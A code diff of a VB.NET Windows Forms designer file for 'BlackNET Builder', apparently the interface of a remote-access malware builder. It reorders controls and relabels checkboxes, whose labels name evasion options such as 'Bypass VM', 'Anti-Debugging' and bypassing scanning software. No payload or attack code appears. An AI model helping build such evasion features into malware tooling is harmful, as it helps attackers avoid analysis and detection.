@@ -24,6 +24,8 @@ Partial Class Form1
     Private Sub InitializeComponent()
         Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
         Me.FormSkin1 = New BlackNet_Builder.FormSkin()
+        Me.PictureBox3 = New System.Windows.Forms.PictureBox()
+        Me.FlatCheckBox13 = New BlackNet_Builder.FlatCheckBox()
         Me.FlatCheckBox12 = New BlackNet_Builder.FlatCheckBox()
         Me.FlatCheckBox11 = New BlackNet_Builder.FlatCheckBox()
         Me.PictureBox2 = New System.Windows.Forms.PictureBox()
@@ -56,12 +58,10 @@ Partial Class Form1
         Me.FlatButton1 = New BlackNet_Builder.FlatButton()
         Me.FlatLabel6 = New BlackNet_Builder.FlatLabel()
         Me.FlatStatusBar1 = New BlackNet_Builder.FlatStatusBar()
-        Me.FlatCheckBox13 = New BlackNet_Builder.FlatCheckBox()
-        Me.PictureBox3 = New System.Windows.Forms.PictureBox()
         Me.FormSkin1.SuspendLayout()
+        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).BeginInit()
         CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).BeginInit()
         CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
-        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).BeginInit()
         Me.SuspendLayout()
         '
         'FormSkin1
@@ -113,6 +113,32 @@ Partial Class Form1
         Me.FormSkin1.Size = New System.Drawing.Size(287, 696)
         Me.FormSkin1.TabIndex = 0
         Me.FormSkin1.Text = "BlackNET Builder"
+        '
+        'PictureBox3
+        '
+        Me.PictureBox3.BackColor = System.Drawing.Color.Transparent
+        Me.PictureBox3.Image = CType(resources.GetObject("PictureBox3.Image"), System.Drawing.Image)
+        Me.PictureBox3.Location = New System.Drawing.Point(106, 531)
+        Me.PictureBox3.Name = "PictureBox3"
+        Me.PictureBox3.Size = New System.Drawing.Size(18, 18)
+        Me.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox3.TabIndex = 37
+        Me.PictureBox3.TabStop = False
+        '
+        'FlatCheckBox13
+        '
+        Me.FlatCheckBox13.BackColor = System.Drawing.Color.FromArgb(CType(CType(60, Byte), Integer), CType(CType(70, Byte), Integer), CType(CType(73, Byte), Integer))
+        Me.FlatCheckBox13.BaseColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(47, Byte), Integer), CType(CType(49, Byte), Integer))
+        Me.FlatCheckBox13.BorderColor = System.Drawing.Color.DeepSkyBlue
+        Me.FlatCheckBox13.Checked = False
+        Me.FlatCheckBox13.Cursor = System.Windows.Forms.Cursors.Hand
+        Me.FlatCheckBox13.Font = New System.Drawing.Font("Segoe UI", 10.0!)
+        Me.FlatCheckBox13.Location = New System.Drawing.Point(3, 501)
+        Me.FlatCheckBox13.Name = "FlatCheckBox13"
+        Me.FlatCheckBox13.Options = BlackNet_Builder.FlatCheckBox._Options.Style1
+        Me.FlatCheckBox13.Size = New System.Drawing.Size(112, 22)
+        Me.FlatCheckBox13.TabIndex = 36
+        Me.FlatCheckBox13.Text = "Bypass VM"
         '
         'FlatCheckBox12
         '
@@ -419,7 +445,7 @@ Partial Class Form1
         Me.FlatCheckBox2.Options = BlackNet_Builder.FlatCheckBox._Options.Style1
         Me.FlatCheckBox2.Size = New System.Drawing.Size(189, 22)
         Me.FlatCheckBox2.TabIndex = 9
-        Me.FlatCheckBox2.Text = "Bypass Scanning Softwares"
+        Me.FlatCheckBox2.Text = "Anti-Debugging"
         '
         'FlatClose1
         '
@@ -556,32 +582,6 @@ Partial Class Form1
         Me.FlatStatusBar1.Text = "Version:"
         Me.FlatStatusBar1.TextColor = System.Drawing.Color.White
         '
-        'FlatCheckBox13
-        '
-        Me.FlatCheckBox13.BackColor = System.Drawing.Color.FromArgb(CType(CType(60, Byte), Integer), CType(CType(70, Byte), Integer), CType(CType(73, Byte), Integer))
-        Me.FlatCheckBox13.BaseColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(47, Byte), Integer), CType(CType(49, Byte), Integer))
-        Me.FlatCheckBox13.BorderColor = System.Drawing.Color.DeepSkyBlue
-        Me.FlatCheckBox13.Checked = False
-        Me.FlatCheckBox13.Cursor = System.Windows.Forms.Cursors.Hand
-        Me.FlatCheckBox13.Font = New System.Drawing.Font("Segoe UI", 10.0!)
-        Me.FlatCheckBox13.Location = New System.Drawing.Point(3, 501)
-        Me.FlatCheckBox13.Name = "FlatCheckBox13"
-        Me.FlatCheckBox13.Options = BlackNet_Builder.FlatCheckBox._Options.Style1
-        Me.FlatCheckBox13.Size = New System.Drawing.Size(112, 22)
-        Me.FlatCheckBox13.TabIndex = 36
-        Me.FlatCheckBox13.Text = "Bypass VM"
-        '
-        'PictureBox3
-        '
-        Me.PictureBox3.BackColor = System.Drawing.Color.Transparent
-        Me.PictureBox3.Image = CType(resources.GetObject("PictureBox3.Image"), System.Drawing.Image)
-        Me.PictureBox3.Location = New System.Drawing.Point(106, 531)
-        Me.PictureBox3.Name = "PictureBox3"
-        Me.PictureBox3.Size = New System.Drawing.Size(18, 18)
-        Me.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
-        Me.PictureBox3.TabIndex = 37
-        Me.PictureBox3.TabStop = False
-        '
         'Form1
         '
         Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
@@ -599,9 +599,9 @@ Partial Class Form1
         Me.TransparencyKey = System.Drawing.Color.Fuchsia
         Me.FormSkin1.ResumeLayout(False)
         Me.FormSkin1.PerformLayout()
+        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).EndInit()
         CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
         CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
-        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).EndInit()
         Me.ResumeLayout(False)
 
     End Sub
